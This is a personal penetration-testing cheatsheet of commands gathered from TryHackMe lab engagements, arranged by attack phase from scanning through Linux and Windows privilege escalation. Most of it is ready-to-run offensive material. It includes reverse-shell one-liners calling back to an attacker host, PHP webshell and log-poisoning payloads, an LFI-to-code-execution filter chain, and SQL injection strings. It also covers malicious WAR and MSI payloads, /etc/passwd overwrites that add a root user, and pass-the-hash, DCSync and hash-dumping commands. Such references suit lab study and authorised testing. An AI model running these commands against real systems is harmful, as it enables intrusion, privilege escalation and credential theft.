# 📋 Command Reference

Personal cheatsheet of frequently used commands across TryHackMe engagements. Organised by phase.

---

## 📑 Table of Contents

- [Recon & Port Scanning](#-recon--port-scanning)
- [Web Enumeration](#-web-enumeration)
- [SQL Injection](#-sql-injection)
- [LFI / Path Traversal](#-lfi--path-traversal)
- [Encoding / Decoding](#-encoding--decoding)
- [Shells](#-shells)
- [SSH / Brute-force](#-ssh)
- [SMB, NFS & Network Services](#-smb-nfs--network-services)
- [Service Exploitation](#-service-exploitation)
- [Hash Cracking](#-hash-cracking)
- [Steganography](#%EF%B8%8F-steganography)
- [Privilege Escalation — Linux](#%EF%B8%8F-privilege-escalation--linux)
- [Privilege Escalation — Windows](#%EF%B8%8F-privilege-escalation--windows)
- [Miscellaneous](#-miscellaneous)

---

## 🔍 Recon & Port Scanning

### nmap

```bash
# Full TCP scan with service/version detection
sudo nmap -sC -sV -p- -vv -T4 <target> -oA tcp-scan

# UDP scan (top ports)
sudo nmap -sU --top-ports 200 -vv -T4 <target> -oA udp-scan

# Script scan on specific port
sudo nmap -sC -sV -p <port> <target>
```

---

## 🌐 Web Enumeration

### ffuf

```bash
# Directory bruteforce
ffuf -u http://<target>/FUZZ -w /path/to/raft-medium-directories.txt -ic -fc 403,401

# File bruteforce
ffuf -u http://<target>/FUZZ -w /path/to/raft-medium-files.txt -ic -fc 403,401

# Extension fuzzing
ffuf -u http://<target>/FUZZ -w /path/to/wordlist.txt -e .php,.txt,.html -ic -fc 403,401

# Vhost fuzzing
ffuf -u http://<target>/ -H 'Host: FUZZ.<domain>' -w /path/to/subdomains.txt -ic -fs <baseline_size>
```

### curl

```bash
# Basic GET
curl -sk http://<target>/path

# POST
curl -sk -X POST -d 'username=admin&password=admin' http://<target>/login.php

# Follow redirects
curl -skL http://<target>/path

# Binary-safe output (required for PHP filter chain RCE)
curl "http://<target>/path" --output -
```

### wpscan

```bash
# Enumerate users, vulnerable plugins/themes, DB exports
wpscan --url http://<target> --api-token $WPTOKEN -e u,vp,vt,dbe

# Password bruteforce against enumerated users
wpscan --url http://<target> -U users.txt -P /usr/share/wordlists/rockyou.txt
```

### cadaver — WebDAV

```bash
cadaver http://<target>/webdav
# interactive: ls, put <file>, get <file>, mput, mget
```

### sqlite3 — Exposed SQLite Databases

```bash
# Download and inspect an exposed SQLite DB (e.g. from /config/bases/ on SPIP)
wget http://<target>/path/to/db.sqlite
sqlite3 db.sqlite

# List tables
sqlite> .tables

# Dump a table
sqlite> SELECT * FROM <table>;

# Schema
sqlite> .schema <table>
```

---

## 💉 SQL Injection

### Manual

```bash
# OR-filter bypass using || (when OR keyword is filtered)
username=admin'+||+1%3d1+--+-&password=x

# Classic
username=admin'--+-
```

### sqlmap

```bash
# From saved request file
sqlmap -r req.txt --batch

# Enumerate databases
sqlmap -r req.txt --dbs --batch

# Dump specific DB
sqlmap -r req.txt -D <dbname> --dump --batch

# Force MySQL, higher level/risk, detect via 302 redirect
sqlmap -r req.txt --dbms=mysql --level=5 --risk=3 --code=302 --batch --tamper=between --dbs

# Time-based blind only
sqlmap -r req.txt --dbms=mysql --technique=T --level=5 --risk=3 --batch -D <dbname> --dump
```

---

## 📂 LFI / Path Traversal

```bash
# Basic path traversal
curl 'http://<target>/page.php?file=../../../../etc/passwd'

# php://filter — direct read
curl 'http://<target>/page.php?file=php://filter/resource=../../../../../etc/passwd'

# php://filter — base64 encode (bypass output filters / read PHP source without executing it)
curl -sk 'http://<target>/page.php?file=php://filter/convert.base64-encode/resource=<file>' \
  | grep -oP '[A-Za-z0-9+/=]{50,}' | head -1 | base64 -d

# Log poisoning — poison User-Agent then include log
curl -sk -A '<?php system($_GET["cmd"]); ?>' http://<target>/
curl 'http://<target>/page.php?file=../../../../var/log/apache2/access.log&cmd=id'
```

### LFI Filter Bypass — `../..` Blocked

If the filter blocks `../..` as a string, swap each `../` for `.././` — it still moves up directories but the blocked pattern never appears.

```bash
# .././ chaining — reads /etc/passwd when filter blocks ../.. and requires /var/www/html/app
curl 'http://<target>/page.php?file=/var/www/html/app/.././.././.././../etc/passwd'

# Alternative: pad with ./ between each ..
curl 'http://<target>/page.php?file=/var/www/html/app/./../././../././../././etc/passwd'
```

Read the PHP source first with `php://filter/base64` — it shows you the exact filter rules so you're not guessing.

### Vhost Discovery from Page Source

Email addresses in a page's source often reveal hidden virtual hostnames. Grep for them, then add what you find to `/etc/hosts`.

```bash
# Pull email/domain strings from the homepage
curl -s http://<target>/ | grep -iE 'href|mail|@' | grep -oP '[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}'

# Add discovered vhost to /etc/hosts
echo "<IP>  <vhost>" | sudo tee -a /etc/hosts
```

### PHP Filter Chain — File-less RCE

**Tool:** https://github.com/synacktiv/php_filter_chain_generator

This turns a plain LFI into code execution with no file upload and no log poisoning. It chains PHP encoding filters in a way that produces PHP code as a side effect. All you need is a working `include`.

```bash
# Generate the chain
CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tail -1)

# Run a command (--output - stops curl from choking on the binary junk in the chain)
curl "http://<target>/vuln.php?file=${CHAIN}&cmd=id" --output -

# Reverse shell
curl "http://<target>/vuln.php?file=${CHAIN}&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<LHOST>%20<LPORT>%20%3E%2Ftmp%2Ff" --output -
```

**Path check bypass — `php://temp?<path>` trick**

Some filters check that your path contains a specific folder name. The chain uses `resource=php://temp` by default, which won't pass that check. Add the required folder as a query string after `php://temp` — PHP ignores it when opening the stream, but the filter sees it and lets the request through.

```bash
# Append the required path as a query string on php://temp
CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
  | tail -1 \
  | sed 's|resource=php://temp|resource=php://temp?/var/www/html/app|')

ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$CHAIN")
CMD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "id")

curl -s "http://<target>/vuln.php?view=${ENCODED}&cmd=${CMD}" | strings | grep -v "html\|head\|body"
```

---

## 🔣 Encoding / Decoding

```bash
# base64 decode / encode
echo '<string>' | base64 -d
echo '<string>' | base64

# base32 decode
echo '<string>' | base32 -d

# Hex to ASCII
echo '<hex>' | xxd -r -p

# ROT13
echo '<string>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Multi-layer chain (e.g. Base32 → Hex → ROT13 as seen in CTF HTML comments)
echo '<string>' | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# URL-encode a payload string (before passing via curl ?cmd= parameter)
python3 -c "import urllib.parse; print(urllib.parse.quote('<command>'))"
```

---

## 🐚 Shells

### Reverse Shell One-liners

```bash
# mkfifo netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> >/tmp/f

# bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# PHP (trigger via webshell cmd parameter)
php -r '$sock=fsockopen("<LHOST>",<LPORT>);shell_exec("/bin/bash <&3 >&3 2>&3");'
```

### Shell Stabilisation

```bash
# Method 1 — python pty
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo; fg
export TERM='xterm'
stty rows <rows> cols <cols>
```

```bash
# Method 2 — script (use when python is unavailable)
script /dev/null -c bash
# ctrl+z
stty raw -echo; fg
export TERM=xterm
stty rows <rows> cols <cols>
```

### Listener

```bash
nc -nlvp <port>
```

---

## 🔑 SSH

```bash
# Connect with key
ssh -i <keyfile> <user>@<target>

# Connect on non-standard port
ssh <user>@<target> -p <port>

# Generate keypair
ssh-keygen -t ed25519 -f ./id_ed25519

# Inject public key (when authorized_keys is writable)
echo '<pubkey>' >> /home/<user>/.ssh/authorized_keys

# Local port forward
ssh -L <localport>:127.0.0.1:<remoteport> <user>@<target>
```

### sshpass — Non-interactive SSH / SCP

```bash
# SSH with password (avoids interactive prompt — useful in scripts)
sshpass -p '<password>' ssh <user>@<target>
sshpass -p '<password>' ssh -p <port> -o StrictHostKeyChecking=no <user>@<target>

# SCP file transfer with password
sshpass -p '<password>' scp -P <port> -o StrictHostKeyChecking=no <localfile> <user>@<target>:/path/
sshpass -p '<password>' scp -P <port> -o StrictHostKeyChecking=no <user>@<target>:/remote/file ./
```

### hydra — Brute-force

```bash
# SSH brute-force with custom wordlist
hydra -l <user> -P <wordlist> ssh://<target> -t 4 -V

# SSH on non-standard port
hydra -l <user> -P <wordlist> ssh://<target>:<port> -t 4 -V

# Multiple usernames
hydra -L <users.txt> -P <wordlist> ssh://<target> -t 4 -V

# HTTP POST form login (failure string = text present on failed login page)
hydra -l <user> -P <wordlist> <target> http-post-form "/login.php:username=^USER^&password=^PASS^:<failure-string>" -t 4 -V

# HTTP GET form login
hydra -l <user> -P <wordlist> <target> http-get-form "/login.php:username=^USER^&password=^PASS^:<failure-string>" -t 4 -V

# FTP brute-force
hydra -l <user> -P <wordlist> ftp://<target> -t 4 -V
```

---

## 🖧 SMB, NFS & Network Services

### SMB Enumeration

```bash
# List shares (anonymous)
smbclient -L //<target> -N

# Connect to share
smbclient //<target>/<share> -N
smbclient //<target>/<share> -U <user>

# Recursive download
smbclient //<target>/<share> -N -c 'recurse ON; prompt OFF; mget *'

# enum4linux — full SMB enumeration
enum4linux -a <target>
```

### NetExec (nxc)

```bash
# SMB command execution
nxc smb <target> -u <user> -p <pass> -x '<command>'

# Check password spray / valid creds
nxc smb <target> -u users.txt -p passwords.txt

# Enumerate shares
nxc smb <target> -u <user> -p <pass> --shares
```

### NFS

```bash
# Show NFS exports
showmount -e <target>

# Mount NFS share
sudo mount -t nfs <target>:/<export> /mnt/nfs

# no_root_squash exploitation — run as root on attacker, writes land as root on target
sudo cp /bin/bash /mnt/nfs/bash
sudo chmod +s /mnt/nfs/bash
# on target:
/tmp/bash -p
```

### Redis

```bash
# Connect
redis-cli -h <target>

# Check config / webroot
CONFIG GET dir
CONFIG GET dbfilename

# Write SSH key via Redis (if running as root or can write to homedir)
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET pwn "\n\n<pubkey>\n\n"
SAVE
```

### Domain / Kerberos Enumeration

```bash
# Username enumeration against Kerberos
kerbrute userenum -d <domain> users.txt --dc <dc-ip>

# SID brute-force to enumerate domain users (works with guest/null session)
impacket-lookupsid <domain>/guest@<target>
impacket-lookupsid <domain>/guest@<target> | grep SidTypeUser
```

---

## 🔧 Service Exploitation

### Tomcat — WAR File Upload RCE

```bash
# Generate WAR reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war

# Upload via Manager (default creds: tomcat:s3cret)
curl -u tomcat:s3cret -T shell.war http://<target>:8080/manager/text/deploy?path=/shell

# Trigger
curl http://<target>:8080/shell/
```

### GPG — Decrypt and Crack

```bash
# Import and decrypt (if passphrase known)
gpg --import private.asc
gpg --decrypt file.pgp

# Crack passphrase with john
gpg2john private.asc > gpg.hash
john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 🔐 Hash Cracking

### hashcat

```bash
# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt

# SHA256
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# sha512crypt ($6$) — Linux /etc/shadow root hashes
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Kerberos 5 TGS (Kerberoasting)
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# Kerberos 5 AS-REP (AS-REP roasting)
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# Show cracked
hashcat --show hash.txt
```

### john

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show

# zip
zip2john archive.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# SSH key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# GPG private key
gpg2john private.asc > gpg.hash
john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### openssl — Generate password hash for /etc/passwd

```bash
openssl passwd -1 -salt xyz <password>   # MD5crypt
openssl passwd -6 -salt xyz <password>   # SHA512crypt
```

---

## 🖼️ Steganography

```bash
# steghide — extract hidden data
steghide extract -sf <image.jpg>
steghide extract -sf <image.jpg> -p <passphrase>
steghide extract -sf <image.jpg> -p <passphrase> -f   # -f force overwrite existing output file

# steghide — inspect without extracting
steghide info <image.jpg>

# stegseek — fast passphrase bruteforce against rockyou
stegseek <image.jpg> /usr/share/wordlists/rockyou.txt

# binwalk — detect and extract embedded files
binwalk <file>
binwalk -e <file>

# strings — quick check for hidden plaintext
strings <file> | grep -i flag
```

---

## ⬆️ Privilege Escalation — Linux

### Enumeration

```bash
# sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# World-writable files (excluding /proc and /sys noise)
find / -type f -writable 2>/dev/null | grep -v -e '/proc' -e '/sys'

# Capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Cron jobs (static — check this first, then run pspy for dynamic jobs)
cat /etc/crontab
ls -la /etc/cron*

# Internal services
ss -ntlp

# Files owned by a specific user
find / -type f -user <username> 2>/dev/null | xargs ls -lah
```

### pspy — Unprivileged Process Monitoring

Watches all running processes without needing root. Use it when `/etc/crontab` shows nothing useful — it catches cron jobs that run for a split second and exit. Let it run for 2-3 minutes.

```bash
# Transfer to target
wget http://<LHOST>:<port>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
./pspy64
```

Look for lines with `UID=0` — those are root-owned processes:

```
CMD: UID=0  PID=xxxx  | /bin/sh -c <command>             ← root is running this
CMD: UID=0  PID=xxxx  | curl <hostname>/<script> | bash  ← root fetches and runs a script
```

When you spot one, ask: can you change the script it runs, the hostname it fetches from, or the folder it runs in?

### Post-Foothold Credential Hunting

Run these on every user you land on before reaching for automated tools.

```bash
# CMS / app config files — almost always plaintext creds
find /var/www -name "*.php" 2>/dev/null | xargs grep -l "password" 2>/dev/null
cat /var/www/html/*/config/database.php 2>/dev/null

# Shell config — env vars used as credential stash
cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null | grep -i 'pass\|token\|secret\|key\|pwd'
env | grep -i 'pass\|token\|secret\|key\|pwd'

# Shell history (if not nulled to /dev/null)
cat ~/.bash_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null

# Decode any base64 tokens found
echo '<token>' | base64 -d
```

### /etc/hosts Poisoning — Cron HTTP Hijack

If a root cron job downloads and runs a script using a hostname (not an IP), and you can write to `/etc/hosts`, you can point that hostname at your machine and serve your own payload:

```bash
# 1. Confirm /etc/hosts is writable
ls -la /etc/hosts

# 2. Redirect hostname to attacker machine
echo "<LHOST>  <hostname>" >> /etc/hosts

# 3. Mirror the expected URL path on attacker and serve payload
mkdir -p <path/matching/cron/url>
cat > <path/matching/cron/url>/script.sh <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF

sudo python3 -m http.server <port>

# 4. Wait for cron to fire, then trigger SUID bash
watch -n 1 ls -lah /bin/bash   # wait until permissions show 'rws'
bash -p
```

### SUID Binary Analysis — strace

Use this on unknown SUID binaries with no man page. It shows every file and program the binary opens when it runs — one of those might be writable by you.

```bash
# Show everything the binary opens or executes
strace /path/to/suid_binary 2>&1 | grep -iE 'exec|open|read'

# Focus on file opens and exec calls
strace /path/to/suid_binary 2>&1 | grep -E 'execve|openat|stat'
```

### SUID Binary Abuse

```bash
# SUID Python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID strings — arbitrary file read (no shell needed)
# Useful when strings is SUID root and you belong to its allowed group
strings /etc/shadow
strings /root/root.txt

# SUID xxd — /etc/passwd overwrite
cp /etc/passwd /tmp/newpasswd
echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /tmp/newpasswd
cat /tmp/newpasswd | xxd | /opt/xxd -r - /etc/passwd
su - hacker

# SUID xxd — arbitrary file read
/opt/xxd /etc/shadow | xxd -r
```

### AppArmor Bypass

AppArmor restricts what programs can do on the system. These two methods run code outside those restrictions.

```bash
# Check if AppArmor is active
aa-status 2>/dev/null
```

**Method 1 — ELF dynamic loader**

Call the dynamic linker (the program that loads other programs) directly. It runs without AppArmor restrictions, so the shell it opens is also unrestricted:

```bash
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
```

From that shell you can write to paths that were blocked before, then run the SUID binary as normal.

**Method 2 — `at` job scheduling**

`at` schedules a command to run later. Those jobs start in a fresh process that AppArmor doesn't restrict. Also useful when text editors are blocked — build your script with `echo >>` line by line instead:

```bash
# Build the script without a text editor
echo '#!/bin/bash' >> /var/tmp/inject.sh
echo 'echo "chmod +s /bin/bash" > /opt/target_script.sh' >> /var/tmp/inject.sh
chmod +x /var/tmp/inject.sh

# Run it via at — outside AppArmor
at now -f /var/tmp/inject.sh

# Check it worked
tail -1 /opt/target_script.sh
```

### Writable Cron Script

```bash
# Append reverse shell or chmod to script executed by root cron
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh

# Wait for cron to fire
watch -n 1 ls -lah /bin/bash

# Trigger SUID bash
/bin/bash -p
```

### Tar Wildcard Injection

```bash
# If root cron runs: tar -czf backup.tgz /path/*
# Create flag files in that directory to inject tar options
cd /path/to/watched/dir
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > shell.sh
```

### Systemd Timer / Service Abuse

```bash
# Check writable unit files
find /etc/systemd/system/ -writable 2>/dev/null

# After editing a timer/service
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart <name>.timer
```

### NFS no_root_squash

```bash
# On attacker (as root) — plant SUID bash on the export
sudo mount -t nfs <target>:/<export> /mnt/nfs
sudo cp /bin/bash /mnt/nfs/bash
sudo chmod +s /mnt/nfs/bash
sudo umount /mnt/nfs

# On target
/path/to/export/bash -p
```

### authorized_keys Injection

```bash
ssh-keygen -t ed25519 -f /tmp/id_ed25519
cat /tmp/id_ed25519.pub >> /home/<user>/.ssh/authorized_keys
ssh -i /tmp/id_ed25519 <user>@<target>
```

### sudo wget — File Overwrite

```bash
sudo wget http://<LHOST>/passwd -O /etc/passwd
```

### lxd / Docker Group

```bash
# lxd
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

---

## ⬆️ Privilege Escalation — Windows

### Enumeration

```powershell
# Current user and privileges
whoami
whoami /priv
whoami /groups

# System info
systeminfo
hostname

# Local users and groups
net user
net localgroup administrators

# Running services
sc query
Get-Service | Where-Object {$_.Status -eq "Running"}

# Scheduled tasks
schtasks /query /fo LIST /v

# Installed software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion

# Network connections
netstat -ano
```

### AlwaysInstallElevated

```powershell
# Check registry keys (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious MSI and execute
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### SeImpersonatePrivilege — Token Impersonation

```powershell
# Check if present
whoami /priv | findstr /i "impersonate"

# PrintSpoofer (Windows 10 / Server 2019+)
.\PrintSpoofer.exe -i -c cmd

# GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
```

### Unquoted Service Paths

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '\"'
```

### Writable Service Binaries / Registry

```powershell
# Check service binary permissions
icacls "C:\path\to\service.exe"

# Check service registry key permissions
accesschk.exe -kw "HKLM\System\CurrentControlSet\Services\<service>"
```

### Pass-the-Hash

```bash
impacket-psexec <domain>/<user>@<target> -hashes :<nthash>
impacket-wmiexec <domain>/<user>@<target> -hashes :<nthash>
impacket-smbexec <domain>/<user>@<target> -hashes :<nthash>
```

### Hash Dumping

```bash
# secretsdump (remote)
impacket-secretsdump <domain>/<user>:<password>@<target>
impacket-secretsdump -hashes :<nthash> <domain>/<user>@<target>

# DCSync
impacket-secretsdump -just-dc <domain>/<user>:<password>@<dc-ip>
```

### AS-REP Roasting / Kerberoasting

```bash
# AS-REP roasting
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>

# Kerberoasting
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request
```

---

## 🧰 Miscellaneous

```bash
# Find files owned by user
find / -user <username> 2>/dev/null

# Transfer file — Python HTTP server
python3 -m http.server 8080
wget http://<LHOST>:8080/<file> -O /tmp/<file>

# Check active timers
systemctl list-timers

# base64 decode/encode
echo '<string>' | base64 -d
echo '<string>' | base64
```
